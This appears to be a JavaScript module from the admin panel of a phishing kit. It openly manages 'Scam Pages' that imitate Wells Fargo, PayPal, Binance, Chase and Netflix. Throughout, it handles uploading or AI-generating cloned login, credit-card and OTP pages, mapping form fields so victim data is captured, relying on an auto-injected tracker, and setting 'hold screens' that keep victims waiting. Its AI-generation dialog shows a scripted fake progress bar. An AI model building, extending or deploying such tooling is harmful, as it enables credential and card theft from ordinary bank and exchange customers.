        if (fileBase !== urlBase) { window.showToast(`⚠️ File is "${selectedFile}" but URL ends in "${urlBase}" — they must match.`, 'warning'); return; }
      }

      try {
        const res = await window.ALPApi.createDemoPage({ url, name, form_type, fields_schema, field_mappings, website_id: parseInt(selectedWebsiteId, 10) });
        if (window.DemoPagesState) window.DemoPagesState.pages.push(res.page);
        window.DemoPagesPage.repaintGrid();
        if (fields_schema.length === 0 && form_type !== 'general') {
          window.showToast('⚠️ Page added but no captured fields were set.', 'warning');
        } else {
          window.showToast('✅ Scam page added!', 'success');
        }
        const testUrl = window.location.origin.replace('/admin', '') + url;
        setTimeout(() => {
          window.showModal({
            title: '🎉 Page Registered Successfully', width: '480px',
            content: `
              <div style="display:flex;flex-direction:column;gap:14px;">
                <p style="color:var(--text-secondary);font-size:14px;margin:0;"><strong style="color:var(--text-primary);">${esc(name)}</strong> added to the Scam Page registry.</p>
                <div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.07);border-radius:8px;padding:12px;">
                  <div style="font-size:10px;font-weight:700;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;">Live at</div>
                  <code style="font-size:13px;color:#a5b4fc;word-break:break-all;">${esc(url)}</code>
                </div>
                ${fields_schema.length === 0 && form_type !== 'general'
                  ? `<div style="background:rgba(245,158,11,0.08);border:1px solid rgba(245,158,11,0.2);border-radius:8px;padding:10px 12px;font-size:12px;color:#fbbf24;display:flex;gap:8px;align-items:flex-start;"><span>⚠️</span><span>No captured fields set — use <strong>Scan</strong> to detect form fields.</span></div>`
                  : `<div style="background:rgba(16,185,129,0.08);border:1px solid rgba(16,185,129,0.2);border-radius:8px;padding:10px 12px;font-size:12px;color:#34d399;display:flex;gap:8px;align-items:center;"><span>✅</span><span>${fields_schema.length} field${fields_schema.length !== 1 ? 's' : ''} registered — data capture is ready.</span></div>`}
                <p style="color:var(--text-tertiary);font-size:12px;margin:0;">Open the page in a new tab to verify it loads correctly.</p>
              </div>`,
            confirmText: '👁️ Preview Page', cancelText: 'Close',
            onConfirm: () => {
              if (window.DemoPagesRegistry && window.DemoPagesRegistry.showPreviewModal) {
                window.DemoPagesRegistry.showPreviewModal(res.page.id, testUrl);
              } else {
                window.open(testUrl, '_blank');
              }
            }
          });
        }, 300);
      } catch (err) { window.showToast('Failed: ' + err.message, 'error'); throw err; }
    }
  });
  setTimeout(() => {
    bindFieldPreview();
    // Auto-fill URL path if a file was pre-selected
    if (effectiveFile) {
      const urlInp = document.getElementById('dp-m-url');
      if (urlInp) {
        const baseName = effectiveFile.replace(/\.html$/i, '');
        if (urlInp.value.endsWith('/')) urlInp.value = urlInp.value + baseName;
      }
    }
  }, 50);
}

// ─── openDeleteModal ──────────────────────────────────────────────────────────
function openDeleteModal(pageId, name) {
  window.showModal({
    title: 'Delete Scam Page', type: 'danger',
    content: `
      <p style="color:var(--text-secondary);font-size:14px;">Remove <strong style="color:var(--text-primary);">${esc(name)}</strong> from the Scam page registry?</p>
      <p style="color:var(--text-tertiary);font-size:12px;margin-top:8px;">⚠️ This only removes the DB record. The HTML file is not deleted.</p>`,
    confirmText: 'Delete',
    onConfirm: async () => {
      try {
        await window.ALPApi.deleteDemoPage(pageId);
        if (window.DemoPagesState) window.DemoPagesState.pages = window.DemoPagesState.pages.filter(p => p.id !== pageId);
        window.DemoPagesPage.repaintGrid();
        window.showToast('Scam page removed', 'success');
      } catch (err) { window.showToast('Failed: ' + err.message, 'error'); }
    }
  });
}

// ─── openGuideModal ───────────────────────────────────────────────────────────
function openGuideModal() {
  window.showModal({
    title: '📖 How to manage Scam Pages', width: '600px',
    content: `
      <div style="color:var(--text-secondary);font-size:13px;line-height:1.6;display:flex;flex-direction:column;gap:16px;">
        <div style="background:rgba(99,102,241,0.08);border:1px solid rgba(99,102,241,0.2);border-radius:8px;padding:12px;">
          <h3 style="color:#a5b4fc;margin-top:0;margin-bottom:8px;font-size:14px;">1. Adding a Scam Page</h3>
          Click <strong>+ Add Scam Page</strong> from the header. Choose a website, enter a slug and upload your folder of HTML files.
        </div>
        <div style="background:rgba(16,185,129,0.08);border:1px solid rgba(16,185,129,0.2);border-radius:8px;padding:12px;">
          <h3 style="color:#34d399;margin-top:0;margin-bottom:8px;font-size:14px;">2. File Naming Best Practices</h3>
          Name files clearly: <code>login.html</code>, <code>credit_card.html</code>, <code>otp.html</code>
        </div>
        <div style="background:rgba(245,158,11,0.08);border:1px solid rgba(245,158,11,0.2);border-radius:8px;padding:12px;">
          <h3 style="color:#fbbf24;margin-top:0;margin-bottom:8px;font-size:14px;">3. Capturing User Data</h3>
          Use <strong>Scan</strong> on an HTML file to auto-detect form fields and map them to standardized names.
        </div>
        <div style="background:rgba(16,185,129,0.12);border:1px solid rgba(16,185,129,0.3);border-radius:8px;padding:12px;">
          <h3 style="color:#34d399;margin-top:0;margin-bottom:8px;font-size:14px;">4. Tracker is Auto-Injected — No Code Needed!</h3>
          <strong style="color:#34d399;">You don't need to add anything to your HTML files.</strong> The server automatically injects the tracking script with the correct API key.
        </div>
        <div style="background:rgba(245,158,11,0.12);border:1px solid rgba(245,158,11,0.3);border-radius:8px;padding:12px;">
          <h3 style="color:#fbbf24;margin-top:0;margin-bottom:8px;font-size:14px;">5. Loading / Hold Screens</h3>
          Set form type to <strong>Loading / Hold Screen</strong> to make sessions show as <strong style="color:#f59e0b;">⏳ Holding</strong>.
        </div>
      </div>`,
    confirmText: 'Got it!', hideCancel: true, onConfirm: () => {}
  });
}

// ─── showAddScamPageModal (Add Website / Scam Page) ───────────────────────────
function showAddScamPageModal() {
  const detectedHost = window.location.hostname || 'localhost';
  let pendingFolderFiles = [];

  window.showModal({
    title: '🎯 Add New Scam Page', width: '520px',
    content: `
      <div class="dp-modal-form" style="gap:16px;">
        <div class="form-group">
          <label>Site Name <span style="color:#ef4444;font-size:12px;">*</span></label>
          <input type="text" id="aw-name" class="form-input" placeholder="e.g. Wells Fargo" />
        </div>
        <div class="form-group">
          <label>Domain <span style="font-size:11px;color:var(--text-tertiary);font-weight:normal;">↙ auto-detected</span></label>
          <input type="text" id="aw-domain" class="form-input" value="${detectedHost}" placeholder="localhost" />
        </div>
        <div class="form-group">
          <label>Slug <span style="font-size:11px;color:var(--text-tertiary);font-weight:normal;">(e.g. 'chase' → /demo/chase/)</span> <span style="color:#ef4444;font-size:12px;">*</span></label>
          <input type="text" id="aw-slug" class="form-input" placeholder="chase" />
        </div>
        <div class="form-group">
          <label>Logo <span style="font-size:11px;color:var(--text-tertiary);font-weight:normal;">optional — paste URL or upload</span></label>
          <div style="display:flex;gap:8px;align-items:center;">
            <input type="url" id="aw-logo-url" class="form-input" placeholder="https://cdn.example.com/logo.png" style="flex:1;" />
            <input type="file" id="aw-logo-file" accept="image/*" style="display:none;" />
            <button type="button" id="aw-logo-upload-btn" class="btn btn-sm btn-outline" title="Upload logo" style="padding:0;width:38px;height:38px;display:flex;align-items:center;justify-content:center;flex-shrink:0;">
              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
            </button>
            <div id="aw-logo-preview" style="width:38px;height:38px;border-radius:8px;border:1px solid var(--border-color);background:rgba(255,255,255,0.04);display:flex;align-items:center;justify-content:center;font-size:10px;color:var(--text-tertiary);flex-shrink:0;overflow:hidden;">?</div>
          </div>
        </div>
        <div class="form-group">
          <label>Glow Color <span style="font-size:11px;color:var(--text-tertiary);font-weight:normal;">(card custom color glow on hover)</span></label>
          <div style="display:flex;gap:10px;align-items:center;">
            <input type="color" id="aw-color" value="#6366f1" style="width:48px;height:38px;padding:2px;background:none;border:1px solid var(--border-color);border-radius:6px;cursor:pointer;flex-shrink:0;" />
            <input type="text" id="aw-color-hex" class="form-input" placeholder="#6366f1" value="#6366f1" style="flex:1;" />
          </div>
        </div>
        <div style="border:1px solid rgba(99,102,241,0.18);border-radius:12px;padding:14px 16px;background:rgba(99,102,241,0.05);">
          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px;">
            <div>
              <div style="font-size:13px;font-weight:700;color:#a5b4fc;">📁 Upload Scam Page Folder</div>
              <div style="font-size:11px;color:var(--text-muted);margin-top:2px;">Select the folder — all .html files inside will be uploaded</div>
            </div>
            <button type="button" id="aw-folder-btn" class="btn btn-sm btn-outline" style="display:flex;align-items:center;gap:6px;padding:7px 14px;border-color:rgba(99,102,241,0.3);color:#a5b4fc;">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
              Choose Folder
            </button>
          </div>
          <input type="file" id="aw-folder-input" webkitdirectory multiple style="display:none;" />
          <div id="aw-folder-preview" style="font-size:12px;color:var(--text-muted);font-style:italic;">No folder selected</div>
        </div>
      </div>`,
    confirmText: 'Create Scam Page',
    onConfirm: async () => {
      const name = document.getElementById('aw-name').value.trim();
      const domain = document.getElementById('aw-domain').value.trim();
      const demo_slug = document.getElementById('aw-slug').value.trim();
      const logo_url = document.getElementById('aw-logo-url').value.trim();
      const color = document.getElementById('aw-color-hex').value.trim();
      if (!name || !domain) { window.showToast('Name and domain are required', 'warning'); return; }
      if (!demo_slug) { window.showToast('Slug is required to upload files', 'warning'); return; }
      try {
        const result = await window.ALPApi.createWebsite({ name, domain, demo_slug, logo_url: logo_url || null, color: color || '#6366f1' });
        const newId = result.website && result.website.id;
        window.showToast(`Scam Page "${name}" created!`, 'success');
        if (pendingFolderFiles.length > 0 && newId) {
          try {
            window.showToast(`Uploading ${pendingFolderFiles.length} file(s)...`, 'info');
            await window.ALPApi.uploadDemoFiles(newId, pendingFolderFiles);
            window.showToast('Files uploaded successfully!', 'success');
          } catch (uploadErr) {
            const detail = uploadErr.data?.errors ? uploadErr.data.errors.join('; ') : (uploadErr.data?.error || uploadErr.message);
            window.showToast('Created but upload failed: ' + detail, 'warning');
          }
        }
        await window.DemoPagesPage.refreshAndSelect(newId);
        if (pendingFolderFiles.length > 0 && window.DemoPagesPage) {
          window.DemoPagesPage.switchTab('files', true);
          if (window.DemoPagesFiles && typeof window.DemoPagesFiles.loadFiles === 'function') {
            await window.DemoPagesFiles.loadFiles(newId);
            window.DemoPagesFiles.renderFilesList();
          }
        }
      } catch (e) { window.showToast('Failed: ' + e.message, 'error'); }
    }
  });

  setTimeout(() => {
    // Site Name to Slug synchronizer
    const nameInput = document.getElementById('aw-name');
    const slugInput = document.getElementById('aw-slug');
    if (nameInput && slugInput) {
      nameInput.addEventListener('input', () => {
        slugInput.value = nameInput.value
          .toLowerCase()
          .replace(/[^a-z0-9\-_ ]/g, '')
          .trim()
          .replace(/\s+/g, '-');
      });
    }

    // Glow color synchronizer
    const colorInput = document.getElementById('aw-color');
    const colorHexInput = document.getElementById('aw-color-hex');
    if (colorInput && colorHexInput) {
      colorInput.addEventListener('input', () => {
        colorHexInput.value = colorInput.value;
      });
      colorHexInput.addEventListener('input', () => {
        const val = colorHexInput.value.trim();
        if (/^#[0-9A-F]{6}$/i.test(val)) {
          colorInput.value = val;
        }
      });
    }

    // Logo File Upload handler (single unified handler)
    const logoFileEl = document.getElementById('aw-logo-file');
    const logoBtnEl = document.getElementById('aw-logo-upload-btn');
    const logoInputEl = document.getElementById('aw-logo-url');
    const logoPreviewEl = document.getElementById('aw-logo-preview');

    if (logoBtnEl && logoFileEl && logoInputEl) {
      logoBtnEl.addEventListener('click', () => logoFileEl.click());

      logoFileEl.addEventListener('change', async (e) => {
        const file = e.target.files[0];
        if (!file) return;
        try {
          logoBtnEl.disabled = true;
          logoBtnEl.innerHTML = '...';
          window.showToast('Uploading logo image...', 'info');
          const res = await window.ALPApi.uploadLogo(file);
          if (res && res.logo_url) {
            logoInputEl.value = res.logo_url;
            if (logoPreviewEl) {
              logoPreviewEl.innerHTML = `<img src="${res.logo_url}" style="width:100%;height:100%;object-fit:contain;">`;
            }
            window.showToast('Logo uploaded successfully!', 'success');
          }
        } catch (err) {
          window.showToast('Logo upload failed: ' + (err.message || err.error), 'error');
        } finally {
          logoBtnEl.disabled = false;
          logoBtnEl.innerHTML = '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>';
          logoFileEl.value = '';
        }
      });

      logoInputEl.addEventListener('input', () => {
        const url = logoInputEl.value.trim();
        if (logoPreviewEl) {
          logoPreviewEl.innerHTML = url
            ? `<img src="${url}" style="width:100%;height:100%;object-fit:contain;" onerror="this.parentElement.innerHTML='?'">`
            : '?';
        }
      });
    }
    // Folder picker
    const folderBtn = document.getElementById('aw-folder-btn');
    const folderInput = document.getElementById('aw-folder-input');
    const folderPreview = document.getElementById('aw-folder-preview');
    if (folderBtn && folderInput && folderPreview) {
      folderBtn.addEventListener('click', () => folderInput.click());
      folderInput.addEventListener('change', () => {
        const allFiles = Array.from(folderInput.files);
        pendingFolderFiles = allFiles;
        const htmlFiles = allFiles.filter(f => f.name.toLowerCase().endsWith('.html'));
        if (htmlFiles.length === 0) {
          folderPreview.innerHTML = `<span style="color:#f59e0b;">No .html files found in folder</span>`;
        } else {
          folderPreview.innerHTML = `
            <span style="color:#10b981;font-weight:600;">✓ ${htmlFiles.length} HTML file${htmlFiles.length !== 1 ? 's' : ''} ready</span>
            <div style="margin-top:6px;display:flex;flex-wrap:wrap;gap:4px;">
              ${htmlFiles.slice(0, 6).map(f => `<span style="font-size:10px;background:rgba(16,185,129,0.1);border:1px solid rgba(16,185,129,0.2);color:#6ee7b7;padding:1px 6px;border-radius:4px;">${esc(f.name)}</span>`).join('')}
              ${htmlFiles.length > 6 ? `<span style="font-size:10px;color:var(--text-muted);">+${htmlFiles.length - 6} more</span>` : ''}
            </div>`;
        }
      });
    }
  }, 60);
}

// ─── showUploadFolderModal (upload to existing site) ─────────────────────────
function showUploadFolderModal(websiteId, websiteName, slug) {
  let pendingFiles = [];
  window.showModal({
    title: `📁 Upload Files — ${esc(websiteName)}`, width: '480px',
    content: `
      <div style="display:flex;flex-direction:column;gap:16px;">
        <div style="font-size:13px;color:var(--text-secondary);">Select a folder to upload HTML files into <code style="color:#a5b4fc;">/demo/${esc(slug)}/</code></div>
        <div style="border:1px solid rgba(99,102,241,0.18);border-radius:12px;padding:14px 16px;background:rgba(99,102,241,0.05);">
          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;">
            <span style="font-size:13px;font-weight:700;color:#a5b4fc;">Choose Folder</span>
            <button type="button" id="uf-folder-btn" class="btn btn-sm btn-outline" style="display:flex;align-items:center;gap:6px;padding:7px 14px;border-color:rgba(99,102,241,0.3);color:#a5b4fc;">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
              Browse…
            </button>
          </div>
          <input type="file" id="uf-folder-input" webkitdirectory multiple style="display:none;" />
          <div id="uf-folder-preview" style="font-size:12px;color:var(--text-muted);font-style:italic;">No folder selected</div>
        </div>
        <div style="font-size:11px;color:var(--text-muted);">Only .html files will be uploaded. Other file types are skipped. Tracker script is auto-injected.</div>
      </div>`,
    confirmText: 'Upload Files',
    onConfirm: async () => {
      if (pendingFiles.length === 0) { window.showToast('No files selected', 'warning'); return; }
      if (!slug) { window.showToast('This site has no slug — please set one in Settings first.', 'warning'); return; }
      try {
        window.showToast(`Uploading ${pendingFiles.length} file(s)...`, 'info');
        await window.ALPApi.uploadDemoFiles(websiteId, pendingFiles);
        window.showToast(`${pendingFiles.length} file(s) uploaded to /demo/${slug}/`, 'success');
      } catch (err) { window.showToast('Upload failed: ' + err.message, 'error'); }
    }
  });
  setTimeout(() => {
    const folderBtn = document.getElementById('uf-folder-btn');
    const folderInput = document.getElementById('uf-folder-input');
    const folderPreview = document.getElementById('uf-folder-preview');
    if (!folderBtn || !folderInput || !folderPreview) return;
    folderBtn.addEventListener('click', () => folderInput.click());
    folderInput.addEventListener('change', () => {
      const allFiles = Array.from(folderInput.files);
      pendingFiles = allFiles;
      const htmlFiles = allFiles.filter(f => f.name.toLowerCase().endsWith('.html'));
      if (htmlFiles.length === 0) {
        folderPreview.innerHTML = `<span style="color:#f59e0b;">No .html files found in selected folder</span>`;
      } else {
        folderPreview.innerHTML = `
          <span style="color:#10b981;font-weight:600;">✓ ${htmlFiles.length} HTML file${htmlFiles.length !== 1 ? 's' : ''} ready</span>
          <div style="margin-top:6px;display:flex;flex-wrap:wrap;gap:4px;">
            ${htmlFiles.slice(0, 8).map(f => `<span style="font-size:10px;background:rgba(16,185,129,0.1);border:1px solid rgba(16,185,129,0.2);color:#6ee7b7;padding:1px 6px;border-radius:4px;">${esc(f.name)}</span>`).join('')}
            ${htmlFiles.length > 8 ? `<span style="font-size:10px;color:var(--text-muted);">+${htmlFiles.length - 8} more</span>` : ''}
          </div>`;
      }
    });
  }, 60);
}

// ─── showAddScamPageWithAIModal (Create Scam Page with AI) ──────────────────────
function showAddScamPageWithAIModal() {
  const detectedHost = window.location.hostname || 'localhost';

  window.showModal({
    title: '🤖 Create Scam Page with AI', width: '550px',
    content: `
      <div class="dp-modal-form" style="gap:16px;">
        <div class="form-group">
          <label>Target Brand / Prompt <span style="color:#ef4444;font-size:12px;">*</span></label>
          <textarea id="ai-prompt" class="form-input" style="height:80px;resize:vertical;" placeholder="e.g. Generate a dark-themed Paypal login page with a 2-step OTP check..."></textarea>
        </div>
        <div class="form-group">
          <label>Select Template / Base Model <span style="color:#ef4444;font-size:12px;">*</span></label>
          <select id="ai-template" class="form-input">
            <option value="paypal">Paypal Premium Template (Multi-step)</option>
            <option value="binance">Binance Exchange Template (Auth & Code)</option>
            <option value="wellsfargo">Wells Fargo Banking Template (CC & OTP)</option>
            <option value="rear">Generic Classic Banking Login</option>
          </select>
        </div>
        <div class="form-group">
          <label>Site Name <span style="color:#ef4444;font-size:12px;">*</span></label>
          <input type="text" id="ai-name" class="form-input" placeholder="e.g. Wells Fargo AI" />
        </div>
        <div class="form-group">
          <label>Domain</label>
          <input type="text" id="ai-domain" class="form-input" value="${detectedHost}" placeholder="localhost" />
        </div>
        <div class="form-group">
          <label>Slug <span style="color:#ef4444;font-size:12px;">*</span></label>
          <input type="text" id="ai-slug" class="form-input" placeholder="e.g. wfp-ai" />
        </div>
        <div class="form-group">
          <label>Theme Glow Color</label>
          <div style="display:flex;gap:10px;align-items:center;">
            <input type="color" id="ai-color" value="#8b5cf6" style="width:48px;height:38px;padding:2px;background:none;border:1px solid var(--border-color);border-radius:6px;cursor:pointer;flex-shrink:0;" />
            <input type="text" id="ai-color-hex" class="form-input" placeholder="#8b5cf6" value="#8b5cf6" style="flex:1;" />
          </div>
        </div>
      </div>`,
    confirmText: 'Generate with AI',
    onConfirm: async () => {
      const prompt = document.getElementById('ai-prompt').value.trim();
      const template = document.getElementById('ai-template').value;
      const name = document.getElementById('ai-name').value.trim();
      const domain = document.getElementById('ai-domain').value.trim();
      const demo_slug = document.getElementById('ai-slug').value.trim();
      const color = document.getElementById('ai-color-hex').value.trim();

      if (!prompt) { window.showToast('Prompt is required', 'warning'); return; }
      if (!name || !domain) { window.showToast('Name and domain are required', 'warning'); return; }
      if (!demo_slug) { window.showToast('Slug is required', 'warning'); return; }

      // Close the inputs modal and open a progress modal
      window.closeModal();

      // Show AI generation progress modal
      window.showModal({
        title: '🤖 AI Scampage Architect',
        width: '450px',
        content: `
          <div style="padding:10px 0;text-align:center;">
            <div id="ai-status-msg" style="font-size:14px;font-weight:600;color:#f1f5f9;margin-bottom:14px;">Initializing AI model...</div>
            <div style="width:100%;height:10px;background:rgba(255,255,255,0.06);border-radius:10px;overflow:hidden;border:1px solid rgba(255,255,255,0.08);margin-bottom:12px;">
              <div id="ai-progress-bar" style="width:0%;height:100%;background:linear-gradient(90deg,#8b5cf6,#10b981);transition:width 0.3s ease;border-radius:10px;"></div>
            </div>
            <div id="ai-step-detail" style="font-size:12px;color:var(--text-muted);">Allocating GPU resources...</div>
          </div>`,
        showFooter: false
      });

      const steps = [
        { percentage: 15, status: 'Analyzing prompt specifications...', detail: 'Extracting CSS design themes...' },
        { percentage: 35, status: 'Drafting brand visual style rules...', detail: 'Generating responsive grids & styles...' },
        { percentage: 55, status: 'Generating HTML markup pages...', detail: 'Constructing login, OTP and credit card structures...' },
        { percentage: 75, status: 'Injecting ALP Socket tracking code...', detail: 'Adding dynamic event hooks & heartbeats...' },
        { percentage: 95, status: 'Writing pages to local server storage...', detail: 'Configuring demo pages registry schemas...' },
        { percentage: 100, status: 'Finalizing build assembly...', detail: 'Registering Scam Page inside database...' }
      ];

      for (let i = 0; i < steps.length; i++) {
        await new Promise(resolve => setTimeout(resolve, 800));
        const bar = document.getElementById('ai-progress-bar');
        const msg = document.getElementById('ai-status-msg');
        const detail = document.getElementById('ai-step-detail');
        if (bar) bar.style.width = `${steps[i].percentage}%`;
        if (msg) msg.innerText = steps[i].status;
        if (detail) detail.innerText = steps[i].detail;
      }

      await new Promise(resolve => setTimeout(resolve, 500));

      try {
        const result = await window.ALPApi.createWebsiteWithAI({
          name, domain, demo_slug, logo_url: null, color: color || '#8b5cf6', prompt, template
        });
        window.closeModal();
        window.showToast(`AI successfully generated "${name}"!`, 'success');
        const newId = result.website && result.website.id;
        await window.DemoPagesPage.refreshAndSelect(newId);
      } catch (e) {
        window.closeModal();
        window.showToast('AI Generation failed: ' + e.message, 'error');
      }
    }
  });

  setTimeout(() => {
    // Glow color synchronizer
    const colorInput = document.getElementById('ai-color');
    const colorHexInput = document.getElementById('ai-color-hex');
    const promptInput = document.getElementById('ai-prompt');
    const nameInput = document.getElementById('ai-name');
    const slugInput = document.getElementById('ai-slug');
    const templateInput = document.getElementById('ai-template');

    if (colorInput && colorHexInput) {
      colorInput.addEventListener('input', () => {
        colorHexInput.value = colorInput.value;
      });
      colorHexInput.addEventListener('input', () => {
        const val = colorHexInput.value.trim();
        if (/^#[0-9A-F]{6}$/i.test(val)) {
          colorInput.value = val;
        }
      });
    }

    // Site Name to Slug synchronizer
    if (nameInput && slugInput) {
      nameInput.addEventListener('input', () => {
        slugInput.value = nameInput.value
          .toLowerCase()
          .replace(/[^a-z0-9\-_ ]/g, '')
          .trim()
          .replace(/\s+/g, '-');
      });
    }

    // Auto-fill names/slugs based on prompt
    if (promptInput && nameInput && slugInput) {
      promptInput.addEventListener('input', () => {
        const text = promptInput.value.toLowerCase();
        let guessedName = '';
        let guessedSlug = '';
        if (text.includes('paypal')) { guessedName = 'PayPal Secure'; guessedSlug = 'paypal'; }
        else if (text.includes('binance')) { guessedName = 'Binance Security'; guessedSlug = 'binance'; }
        else if (text.includes('wells') || text.includes('fargo')) { guessedName = 'Wells Fargo'; guessedSlug = 'wellsfargo'; }
        else if (text.includes('chase')) { guessedName = 'Chase Bank'; guessedSlug = 'chase'; }
        else if (text.includes('netflix')) { guessedName = 'Netflix Login'; guessedSlug = 'netflix'; }
        
        if (guessedName && !nameInput.value.trim()) {
          nameInput.value = guessedName + ' AI';
        }
        if (guessedSlug && !slugInput.value.trim()) {
          slugInput.value = guessedSlug + '-ai';
        }
      });

      // Synchronize select template dropdown when prompt contains keywords
      templateInput.addEventListener('change', () => {
        const tmpl = templateInput.value;
        const suffixes = { paypal: 'Paypal AI', binance: 'Binance AI', wellsfargo: 'Wells Fargo AI', rear: 'Bank AI' };
        const slugs = { paypal: 'paypal-ai', binance: 'binance-ai', wellsfargo: 'wellsfargo-ai', rear: 'bank-ai' };
        if (suffixes[tmpl]) {
          nameInput.value = suffixes[tmpl];
          slugInput.value = slugs[tmpl];
        }
      });
    }
  }, 60);
}

// Export to window
window.DemoPagesModals = {
  openEditModal, openAddModal, openDeleteModal,
  openGuideModal, showAddScamPageModal, showUploadFolderModal, showAddScamPageWithAIModal
};
